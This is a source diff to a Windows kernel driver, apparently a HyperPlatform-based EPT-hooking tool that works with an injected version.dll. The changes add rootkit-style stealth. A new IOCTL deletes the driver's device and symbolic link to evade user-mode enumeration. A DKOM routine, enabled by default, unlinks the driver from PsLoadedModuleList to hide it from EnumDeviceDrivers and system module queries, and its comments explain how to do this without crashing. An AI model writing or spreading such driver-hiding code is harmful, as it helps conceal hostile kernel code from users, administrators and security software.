@@ -62,7 +62,7 @@ typedef struct _TD_LDR_ENTRY {
     ULONG      SizeOfImage;
     TD_UNICODE_STRING FullDllName;
     TD_UNICODE_STRING BaseDllName;
-} TD_LDR_ENTRY;
+} TD_LDR_ENTRY, *PTD_LDR_ENTRY;
 
 typedef struct _TD_PEB_LDR_DATA {
     ULONG      Length;
@@ -1436,6 +1436,11 @@ TdCloseCreatedThreadHandle(HANDLE thread_h, BOOLEAN thread_started)
 
 // ---- device / IOCTL ----
 
+// forward declarations for globals defined at driver entry / unload section.
+// NOT static — extern matches the non-static definitions below.
+extern PDEVICE_OBJECT g_dev_obj;
+extern BOOLEAN g_device_hidden;
+
 #define TD_DEVICE_NAME  L"\\Device\\OphionTest"
 #define TD_SYMLINK_NAME L"\\DosDevices\\OphionTest"
 
@@ -1447,6 +1452,7 @@ TdCloseCreatedThreadHandle(HANDLE thread_h, BOOLEAN thread_started)
 #define IOCTL_EPT_UNHOOK_R3 CTL_CODE(FILE_DEVICE_UNKNOWN, TD_IOCTL_BASE + 4, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_RESOLVE_EXPORT CTL_CODE(FILE_DEVICE_UNKNOWN, TD_IOCTL_BASE + 12, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_GET_MODULE_BASE CTL_CODE(FILE_DEVICE_UNKNOWN, TD_IOCTL_BASE + 13, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_HIDE_DEVICE     CTL_CODE(FILE_DEVICE_UNKNOWN, TD_IOCTL_BASE + 14, METHOD_BUFFERED, FILE_ANY_ACCESS)
 
 #pragma pack(push, 8)
 typedef struct _TD_RESOLVE_EXPORT_PARAMS {
@@ -6309,6 +6315,40 @@ static NTSTATUS TdIoControl(PDEVICE_OBJECT, PIRP irp)
         break;
     }
 
+    case IOCTL_HIDE_DEVICE:
+    {
+        //
+        // Hides the device & symlink from user-mode enumeration.
+        // Called by version.dll after all init is done — the device is no longer
+        // needed (EPT hooks are already installed). TdUnload checks g_device_hidden
+        // and skips IoDeleteSymbolicLink / IoDeleteDevice when already torn down.
+        //
+        g_device_hidden = TRUE;
+
+        UNICODE_STRING sym;
+        RtlInitUnicodeString(&sym, TD_SYMLINK_NAME);
+        // Best-effort: delete symlink first so namespace enumeration stops seeing
+        // it, then delete the device object. Either failure is non-fatal.
+        NTSTATUS st1 = IoDeleteSymbolicLink(&sym);
+        if (!NT_SUCCESS(st1))
+        {
+            HYPERPLATFORM_LOG_WARN("[td] hide device: symlink delete failed 0x%08X (may already be removed)", st1);
+        }
+
+        if (g_dev_obj)
+        {
+            IoDeleteDevice(g_dev_obj);
+            HYPERPLATFORM_LOG_INFO("[td] device + symlink hidden. IOCTL_HIDE_DEVICE done.");
+        }
+        else
+        {
+            HYPERPLATFORM_LOG_WARN("[td] hide device: g_dev_obj is NULL (already hidden?)");
+        }
+
+        st = STATUS_SUCCESS;
+        break;
+    }
+
     default:
         st = STATUS_INVALID_DEVICE_REQUEST;
         HYPERPLATFORM_LOG_ERROR("[td-ioctl] unhandled IOCTL code=0x%08X", io->Parameters.DeviceIoControl.IoControlCode);
@@ -6652,6 +6692,9 @@ TdProcessNotifyLegacy(HANDLE ParentId, HANDLE ProcessId, BOOLEAN Create)
 //  driver entry / unload
 // =========================================================================
 
+PDEVICE_OBJECT g_dev_obj = NULL;
+BOOLEAN g_device_hidden = FALSE;
+
 static VOID TdUnload(PDRIVER_OBJECT drv)
 {
     if (g_process_notify_registered)
@@ -6672,15 +6715,44 @@ static VOID TdUnload(PDRIVER_OBJECT drv)
 
     TdEptUnhookAllR3();
 
-    UNICODE_STRING sym;
-    RtlInitUnicodeString(&sym, TD_SYMLINK_NAME);
-    IoDeleteSymbolicLink(&sym);
-    if (drv->DeviceObject) IoDeleteDevice(drv->DeviceObject);
-    HYPERPLATFORM_LOG_INFO("[td] Unloaded.");
+    if (!g_device_hidden)
+    {
+        UNICODE_STRING sym;
+        RtlInitUnicodeString(&sym, TD_SYMLINK_NAME);
+        IoDeleteSymbolicLink(&sym);
+        if (drv->DeviceObject) IoDeleteDevice(drv->DeviceObject);
+    }
+
+    HYPERPLATFORM_LOG_INFO("[td] Unloaded (device_hidden=%u).", g_device_hidden);
     LogTermination();
 }
 
 extern "C"
+// DKOM: unlink this driver from PsLoadedModuleList so EnumDeviceDrivers /
+// NtQuerySystemInformation(SystemModuleInformation) can't enumerate it.
+// DriverObject->DriverSection points to the kernel LDR_DATA_TABLE_ENTRY.
+// Links are set to self after unlinking so RemoveEntryList on unload is a
+// no-op (safe). Must be called AFTER all init (MmGetSystemRoutineAddress,
+// IoCreateDevice, etc.) so those APIs find the driver while it's set up.
+#ifndef TD_HIDE_DRIVER
+#define TD_HIDE_DRIVER 1
+#endif
+#if TD_HIDE_DRIVER
+static VOID TdHideFromPsLoadedModuleList(PDRIVER_OBJECT drv)
+{
+    PTD_LDR_ENTRY ldr = (PTD_LDR_ENTRY)drv->DriverSection;
+    if (!ldr) return;
+    // PsLoadedModuleList links kernel modules ONLY via InLoadOrderLinks.
+    // InMemoryOrderLinks / InInitializationOrderLinks are NOT initialized by
+    // MiLoadSystemImage for kernel modules - they hold stale pool data, so
+    // unlinking them dereferences garbage and BSODs. Only unlink
+    // InLoadOrderLinks, then self-link so RemoveEntryList on unload is a no-op.
+    PLIST_ENTRY e = &ldr->InLoadOrderLinks;          // PsLoadedModuleList
+    e->Blink->Flink = e->Flink; e->Flink->Blink = e->Blink;
+    e->Flink = e; e->Blink = e;
+}
+#endif
+
 NTSTATUS DriverEntry(PDRIVER_OBJECT drv, PUNICODE_STRING reg)
 {
     UNREFERENCED_PARAMETER(reg);
@@ -6733,6 +6805,7 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT drv, PUNICODE_STRING reg)
     NTSTATUS st = IoCreateDevice(drv, 0, &dev_name,
         FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &dev);
     if (!NT_SUCCESS(st)) return st;
+    g_dev_obj = dev;
 
     st = IoCreateSymbolicLink(&sym_name, &dev_name);
     if (!NT_SUCCESS(st)) { IoDeleteDevice(dev); return st; }
@@ -6768,6 +6841,11 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT drv, PUNICODE_STRING reg)
             HYPERPLATFORM_LOG_ERROR("[td] PsSetCreateProcessNotifyRoutine legacy failed: 0x%08X", legacy_st);
         }
     }
+
+#if TD_HIDE_DRIVER
+    // DKOM: hide this driver from PsLoadedModuleList (after all init).
+    TdHideFromPsLoadedModuleList(drv);
+#endif
 
     HYPERPLATFORM_LOG_INFO("[td] Loaded. Device: %wZ", &sym_name);
     return STATUS_SUCCESS;
